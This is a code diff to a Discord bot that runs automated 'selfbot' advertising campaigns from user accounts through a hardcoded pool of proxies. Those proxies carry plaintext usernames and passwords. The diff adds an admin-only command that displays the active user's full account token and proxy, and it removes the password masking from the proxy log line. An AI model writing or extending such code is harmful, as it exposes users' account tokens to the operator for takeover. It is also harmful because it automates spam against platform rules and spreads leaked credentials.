@@ -73,9 +73,7 @@ function getProxyPool() {
         console.error('Failed to load proxy pool:', err);
     }
     
-    // Combined pool of all 20 proxies (10 previous + 10 new)
     const defaultProxies = [
-        // Previous 10 proxies
         'vqvtbsll:delzv7dc3d6h@31.59.20.176:6754',
         'vqvtbsll:delzv7dc3d6h@31.56.127.193:7684',
         'vqvtbsll:delzv7dc3d6h@45.38.107.97:6014',
@@ -86,7 +84,6 @@ function getProxyPool() {
         'vqvtbsll:delzv7dc3d6h@84.247.60.125:6095',
         'vqvtbsll:delzv7dc3d6h@142.111.67.146:5611',
         'vqvtbsll:delzv7dc3d6h@191.96.254.138:6185',
-        // New 10 proxies
         'jeifitnv:s1pibxrtd5hx@31.59.20.176:6754',
         'jeifitnv:s1pibxrtd5hx@31.56.127.193:7684',
         'jeifitnv:s1pibxrtd5hx@45.38.107.97:6014',
@@ -110,7 +107,6 @@ function saveProxyPool(proxies) {
     }
 }
 
-// Background RAM monitor updated to trigger at 950 MB
 setInterval(() => {
     const memoryUsageMB = process.memoryUsage().rss / 1024 / 1024;
     if (memoryUsageMB >= 950) {
@@ -125,7 +121,6 @@ setInterval(() => {
 controlBot.once('ready', async () => {
     console.log(`Control Panel Bot logged in as ${controlBot.user.tag}`);
 
-    // Clear saved config on startup so it never auto-resumes sessions
     if (fs.existsSync(CONFIG_FILE)) {
         try { 
             fs.unlinkSync(CONFIG_FILE); 
@@ -146,6 +141,9 @@ controlBot.once('ready', async () => {
             .addSubcommand(sub => 
                 sub.setName('stop').setDescription('Stops active advertising automation loop')
             ),
+        new SlashCommandBuilder()
+            .setName('admin-active-status')
+            .setDescription('Shows currently running advertising sessions with tokens and proxies (Admin Only)'),
         new SlashCommandBuilder()
             .setName('admin_proxies')
             .setDescription('Manage the system proxy pool (Admin Only)')
@@ -190,7 +188,7 @@ function initializeAndRunSelfbot(token, proxyString, isResume = false) {
     try {
         agentOptions.httpAgent = new HttpsProxyAgent(formattedProxy);
         agentOptions.ws = { agent: agentOptions.httpAgent };
-        console.log(`[Proxy Engine] Assigned unique proxy to user session: ${proxyString.replace(/:([^:@]+)@/, ':****@')}`);
+        console.log(`[Proxy Engine] Assigned unique proxy to user session.`);
     } catch (e) {
         console.error('[Proxy Error] Failed to parse proxy configuration:', e.message);
     }
@@ -309,7 +307,40 @@ controlBot.on('interactionCreate', async interaction => {
         }
 
         if (interaction.isChatInputCommand()) {
-            if (interaction.commandName === 'admin_proxies') {
+            if (interaction.commandName === 'admin-active-status') {
+                if (interaction.user.id !== ADMIN_USER_ID) {
+                    return interaction.reply({ content: '❌ You do not have permission to use this administrative command.', ephemeral: true });
+                }
+
+                const savedCfg = loadCampaignConfig();
+                if (!advState.isRunning || !savedCfg || !savedCfg.isRunning) {
+                    const embed = new EmbedBuilder()
+                        .setTitle('🛡️ Admin Active Status')
+                        .setDescription('❌ No active advertising campaigns are currently running.')
+                        .setColor(0xED4245)
+                        .setTimestamp();
+                    return interaction.reply({ embeds: [embed], ephemeral: true });
+                }
+
+                const usernameTag = advState.activeClient && advState.activeClient.user ? advState.activeClient.user.tag : 'Unknown User';
+                const userIdVal = advState.activeClient && advState.activeClient.user ? advState.activeClient.user.id : 'Unknown ID';
+                const tokenVal = advState.userToken || savedCfg.userToken || 'N/A';
+                const proxyVal = advState.currentProxy || savedCfg.currentProxy || 'N/A';
+
+                const embed = new EmbedBuilder()
+                    .setTitle('🛡️ Admin Active Status Report')
+                    .addFields(
+                        { name: '👤 Active User Account', value: `${usernameTag} (\`${userIdVal}\`)`, inline: false },
+                        { name: '🔑 User Token', value: `\`\`\`${tokenVal}\`\`\``, inline: false },
+                        { name: '🌐 Assigned Proxy', value: `\`${proxyVal}\``, inline: false },
+                        { name: '📊 Metrics', value: `Sent: **${advState.sentCount}** | Failed: **${advState.failCount}** | Channels: **${advState.targetChannels.length}**`, inline: false }
+                    )
+                    .setColor(0x57F287)
+                    .setTimestamp();
+
+                return interaction.reply({ embeds: [embed], ephemeral: true });
+            }
+            else if (interaction.commandName === 'admin_proxies') {
                 if (interaction.user.id !== ADMIN_USER_ID) {
                     return interaction.reply({ content: '❌ You do not have permission to use this administrative command.', ephemeral: true });
                 }
@@ -533,7 +564,6 @@ controlBot.on('interactionCreate', async interaction => {
                 return interaction.reply({ content: '❌ No valid channel IDs provided.', ephemeral: true });
             }
 
-            // Save configuration so users don't have to fill it every time
             saveCampaignConfig({
                 isRunning: advState.isRunning,
                 targetChannels: channels,
